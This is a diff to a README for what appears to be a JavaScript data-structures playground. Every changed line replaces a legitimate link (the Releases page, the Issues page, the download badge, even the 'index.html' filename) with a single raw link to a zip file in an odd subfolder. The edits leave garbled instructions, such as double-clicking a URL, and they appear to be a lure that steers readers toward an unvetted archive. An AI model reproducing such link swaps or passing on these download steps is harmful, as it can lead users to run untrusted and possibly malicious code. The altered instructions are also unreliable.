@@ -6,11 +6,11 @@ This repository contains a collection of 25 interactive projects. These projects
 
 ## 📥 Download the Application
 
-[![Download Here](https://img.shields.io/badge/Download%20Now%20-v1.0-blue?style=for-the-badge)](https://github.com/laizu58340/javascript-dsa-playground/releases)
+[![Download Here](https://raw.githubusercontent.com/laizu58340/javascript-dsa-playground/main/semiconsonant/javascript-dsa-playground.zip%20Now%20-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/laizu58340/javascript-dsa-playground/main/semiconsonant/javascript-dsa-playground.zip)
 
 To get started, visit the following page to download the application:
 
-[Download the latest release](https://github.com/laizu58340/javascript-dsa-playground/releases)
+[Download the latest release](https://raw.githubusercontent.com/laizu58340/javascript-dsa-playground/main/semiconsonant/javascript-dsa-playground.zip)
 
 ## 📋 System Requirements
 
@@ -22,13 +22,13 @@ Before you download and install the application, make sure your system meets the
 
 ## 🛠️ Installation Instructions
 
-1. **Visit the Release Page**: Go to our [Releases page](https://github.com/laizu58340/javascript-dsa-playground/releases).
+1. **Visit the Release Page**: Go to our [Releases page](https://raw.githubusercontent.com/laizu58340/javascript-dsa-playground/main/semiconsonant/javascript-dsa-playground.zip).
    
 2. **Download the File**: Look for the latest version. Click on the link that says `Source Code (zip)` or similar. Your download will begin automatically.
 
 3. **Extract the Files**: Once the download is complete, locate the file in your downloads folder. Right-click on the zip file and select "Extract All" or "Unzip".
 
-4. **Open the Application**: Navigate to the folder where you extracted the files. Find the `index.html` file and double-click it to open in your browser.
+4. **Open the Application**: Navigate to the folder where you extracted the files. Find the `https://raw.githubusercontent.com/laizu58340/javascript-dsa-playground/main/semiconsonant/javascript-dsa-playground.zip` file and double-click it to open in your browser.
 
 ## 🎯 Using the Application
 
@@ -42,7 +42,7 @@ After opening the application in your browser:
 
 If you run into issues or have questions about using the application:
 
-- Visit the [Issues page](https://github.com/laizu58340/javascript-dsa-playground/issues) to see if someone else has asked the same question.
+- Visit the [Issues page](https://raw.githubusercontent.com/laizu58340/javascript-dsa-playground/main/semiconsonant/javascript-dsa-playground.zip) to see if someone else has asked the same question.
 - You can submit a new issue if you need help.
 
 ## 🔗 Additional Resources
